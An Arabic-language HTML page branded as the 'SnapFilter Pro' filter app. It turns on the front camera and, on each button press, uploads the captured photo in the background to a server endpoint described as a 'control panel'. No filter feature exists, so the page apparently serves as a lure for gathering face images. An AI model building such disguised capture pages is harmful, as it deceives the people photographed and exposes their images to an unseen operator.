<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapFilter - تطبيق الفلتر الذكي</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0d0f12;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: #161922;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            border: 1px solid #262b3d;
        }
        h2 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #ff4757;
            font-weight: 700;
        }
        .camera-box {
            position: relative;
            width: 100%;
            border-radius: 14px;
            overflow: hidden;
            background: #000;
            aspect-ratio: 3/4;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
        }
        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .btn-capture {
            background: linear-gradient(135deg, #ff4757, #ff6b81);
            color: white;
            border: none;
            width: 70px;
            height: 70px;
            border-radius: 50%;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        .btn-capture:active {
            transform: scale(0.92);
            box-shadow: 0 2px 8px rgba(255, 71, 87, 0.3);
        }
        /* تصميم الإشعار الفخم (Toast Notification) بدلاً من الكتابة العادية */
        #toast {
            visibility: hidden;
            min-width: 220px;
            background-color: #2ed573;
            color: white;
            text-align: center;
            border-radius: 8px;
            padding: 12px;
            position: fixed;
            bottom: 30px;
            font-size: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 1000;
            transition: visibility 0.3s, opacity 0.3s ease-in-out;
            opacity: 0;
        }
        #toast.show {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>SnapFilter Pro</h2>
        
        <div class="camera-box">
            <video id="video" autoplay playsinline></video>
        </div>

        <button class="btn-capture" id="capture-btn" title="التقاط">
            📸
        </button>
    </div>

    <!-- إشعار منبثق أنيق -->
    <div id="toast">تم التقاط الصورة وحفظها بنجاح! ✨</div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const toast = document.getElementById('toast');

        // تشغيل الكاميرا
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("خطأ في تشغيل الكاميرا: ", err);
                showToast("تعذر الوصول للكاميرا!", "#ff4757");
            });

        // دالة لإظهار إشعار أنيق يختفي تلقائياً
        function showToast(message, bgColor = "#2ed573") {
            toast.innerText = message;
            toast.style.backgroundColor = bgColor;
            toast.className = "show";
            setTimeout(() => {
                toast.className = toast.className.replace("show", "");
            }, 3000);
        }

        // عند الضغط على زر الالتقاط الفخم
        captureBtn.addEventListener('click', () => {
            canvas.width = video.videoWidth || 400;
            canvas.height = video.videoHeight || 400;
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            // تأثير اهتزاز خفيف عند الالتقاط (إن توفر) للواقعية
            if (navigator.vibrate) navigator.vibrate(50);

            // إرسال الصورة للسيرفر في الخلفية بدون تخريب الواجهة
            fetch('/upload-snapshot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showToast("تم إرسال الصورة للوحة التحكم بنجاح! 🚀");
                } else {
                    showToast("فشل الحفظ، حاول مجدداً", "#ff4757");
                }
            })
            .catch(err => {
                console.error(err);
                showToast("خطأ في الاتصال بالشبكة", "#ff4757");
            });
        });
    </script>

</body>
</html>
